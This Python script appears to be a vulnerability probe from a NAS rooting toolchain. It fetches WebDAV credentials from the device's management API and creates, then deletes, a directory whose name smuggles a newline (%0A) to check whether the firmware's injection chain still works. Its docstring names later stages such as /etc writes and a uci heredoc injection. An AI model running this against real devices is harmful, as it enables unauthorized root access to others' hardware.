#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""写预演：确认当前固件是否仍接受含控制字符的目录名（注入链第一环）。

只做两件事：
  1. 在 /pool0/data/ 下 MKCOL 一个含 %0A 的一次性随机目录
  2. 立刻 DELETE 掉

不创建 SMB 账号、不写 /etc、不布防 preload、不启动任何服务。这一环通过
才值得继续跑 root；不通过说明厂商已修补 MKCOL，继续跑只会在设备上留下
无用的临时 SMB 账号。

用法：
  python -X utf8 core/write_probe.py
退出码：
  0 = GO（201 + 已清理）
  2 = 拿不到 WebDAV 凭据
  3 = 目录名被拒绝，固件已修补
  4 = 预演目录删除失败（需手动清理，脚本会打印路径）
"""
import base64
import importlib.util
import sys
import uuid
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "core"))

import nowsl_run  # noqa: E402


def status_of(resp):
    return resp.split("\r\n", 1)[0].strip() if resp else "(empty)"


def code_is(resp, code):
    text = status_of(resp)
    return (" %d " % code) in text or text.endswith(" %d" % code)


def main():
    cfg = nowsl_run.load_config()
    host = (cfg.get("device") or {}).get("host")
    if not host:
        nowsl_run.die("配置里没有 device.host")

    mod = nowsl_run.load_module("minas_root_stage1", nowsl_run.find_root_tool())
    cert_dir = str(nowsl_run.cert_paths(cfg))
    nas = mod.Nas(host, cert_dir)
    print("SNI:", nas.sn, "| UID:", nas.uid)

    info = nas.json_body(nas.https("/cgi-bin/luci/filemgr/get_pool_info",
                                   {"selector": ["webDAV"]}))
    webdav = (info.get("data") or {}).get("webDAV") or {}
    if not webdav.get("username") or not webdav.get("password"):
        print("NO-GO: get_pool_info 未返回完整 WebDAV 凭据")
        return 2
    auth = "Basic " + base64.b64encode(
        ("%s:%s" % (webdav["username"], webdav["password"])).encode()).decode()

    name = "MINASPROBE_" + uuid.uuid4().hex[:8] + "%0A" + uuid.uuid4().hex[:8]
    path = "/pool0/data/" + name + "/"
    print("preview dir:", name)

    mk = nas.webdav("MKCOL", path, auth=auth)
    print("MKCOL  ->", status_of(mk))
    if not code_is(mk, 201):
        print("NO-GO: 控制字符目录名被拒绝（MKCOL 环节已修补），不进入后续步骤")
        return 3

    deleted = False
    for attempt in range(1, 4):
        resp = nas.webdav("DELETE", path, auth=auth)
        print("DELETE attempt %d -> %s" % (attempt, status_of(resp)))
        if code_is(resp, 204) or code_is(resp, 200) or code_is(resp, 404):
            deleted = True
            break
    if not deleted:
        print("NO-GO: 预演目录未能自动删除，请手动清理后再继续：")
        print("  DELETE https://%s:5000%s" % (host, path))
        return 4

    print("GO: MKCOL 201 + DELETE 已确认，目录已清理")
    print("注意: 仅证明 MKCOL 环节；uci heredoc 注入点仍需实际部署才能确认")
    return 0


if __name__ == "__main__":
    sys.exit(main())
